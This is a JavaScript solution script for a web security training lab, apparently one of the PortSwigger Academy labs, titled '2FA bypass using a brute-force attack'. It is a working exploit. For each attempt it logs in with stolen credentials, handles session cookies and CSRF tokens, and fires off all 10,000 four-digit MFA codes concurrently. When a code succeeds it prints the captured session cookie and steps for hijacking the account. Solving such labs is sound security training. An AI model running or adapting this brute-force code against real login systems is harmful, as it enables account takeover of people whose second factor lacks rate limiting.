import { getParsedInput } from "../../../utils/getParsedInput.js";
import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";
import { runTasks } from "../../../utils/runTasks.js";

const { url, concurrencyLimit, httpClient } = getParsedInput({
  description: "Lab: 2FA bypass using a brute-force attack",
  concurrency: true,
});

await pressEnterToContinue(`
As the verification code will reset while you're running your attack,
you may need to repeat this attack several times before you succeed.
This is because the new code may be a number that your current attack 
has already attempted.`);

const csrfRegex = /value="(.+)"/;

function extractSessionCookie(response) {
  return response.headers["set-cookie"][0].split(";")[0];
}

function extractCSRF(response) {
  return response.data.match(csrfRegex)[1];
}

const creds = { username: "carlos", password: "montoya" };

async function task(index) {
  let response = await httpClient.get(url + "login");
  let session = extractSessionCookie(response);
  let csrf = extractCSRF(response);

  response = await httpClient.post(
    url + "login",
    new URLSearchParams({ csrf: csrf, ...creds }),
    {
      headers: {
        cookie: session,
      },
    },
  );
  session = extractSessionCookie(response);

  response = await httpClient.get(url + "login2", {
    headers: {
      cookie: session,
    },
  });
  csrf = extractCSRF(response);

  //Only one post /login2 with mfa-code per task so that we can do concurrent requests
  const code = index.toString().padStart(4, "0");
  response = await httpClient.post(
    url + "login2",
    new URLSearchParams({ csrf: csrf, "mfa-code": code }),
    {
      headers: {
        cookie: session,
      },
    },
  );

  if (response.status === 302) {
    console.log(`${code}: success`);

    const session = extractSessionCookie(response);
    console.log(
      `To solve the lab:
        1. Go to home lab page.
        2. Set your browser cookie with key 'session' and value '${session}', refresh the page.
        3. Go to 'My account page'`,
    );
    process.exit(0);
  }
  console.log(`${code}: fail`);
}

const tasks = [];
for (let i = 0; i < 10_000; i++) {
  tasks.push(() => task(i));
}

runTasks(tasks, concurrencyLimit);
